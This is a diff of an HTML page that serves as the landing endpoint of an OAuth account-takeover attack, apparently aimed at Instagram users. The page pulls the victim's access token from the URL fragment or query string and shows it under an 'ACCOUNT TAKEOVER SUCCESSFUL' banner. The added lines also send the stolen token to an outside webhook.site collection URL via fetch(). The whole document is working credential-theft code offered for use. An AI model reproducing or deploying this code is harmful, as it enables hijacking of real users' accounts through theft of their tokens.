@@ -1,32 +1,26 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Token Catcher</title>
+    <title>Token Captured</title>
+    <style>
+        body { background: black; color: #0f0; font-family: monospace; padding: 20px; }
+        .token { color: white; word-break: break-all; border: 1px solid #0f0; padding: 10px; }
+    </style>
 </head>
-<body style="font-family: monospace; padding: 20px; background-color: #f0f0f0;">
-    <h2 style="color: red;">Exploit Successful!</h2>
-    <h3>Stolen LVA Token:</h3>
-    <div id="token" style="background: #333; color: #0f0; padding: 15px; word-wrap: break-word;">Waiting...</div>
+<body>
+    <h2>[!] ACCOUNT TAKEOVER SUCCESSFUL</h2>
+    <p>Victim OAuth Token:</p>
+    <div id="display" class="token">Waiting for token...</div>
 
     <script>
-        // Instagram might send the token in the query parameters (?token=...) 
-        // or the URL fragment (#token=...). This script grabs both.
-        const urlParams = new URLSearchParams(window.location.search);
-        const hashParams = new URLSearchParams(window.location.hash.substring(1));
+        // Extract token from the URL (usually after the # or ?)
+        const params = new URLSearchParams(window.location.hash.substring(1));
+        const token = params.get('access_token') || new URLSearchParams(window.location.search).get('token');
         
-        let stolenData = "";
-        
-        if (urlParams.toString()) {
-            stolenData += "Query Params: " + urlParams.toString() + "\n\n";
-        }
-        if (hashParams.toString()) {
-            stolenData += "Hash Params: " + hashParams.toString();
-        }
-
-        if (stolenData) {
-            document.getElementById('token').innerText = stolenData;
-        } else {
-            document.getElementById('token').innerText = "No token received. Check the URL.";
+        if (token) {
+            document.getElementById('display').innerText = token;
+            // Send to your webhook.site for your records
+            fetch('https://webhook.site/d5f136cb-a709-4c28-ba8e-2a998bfd9100?stolen_token=' + token);
         }
     </script>
 </body>
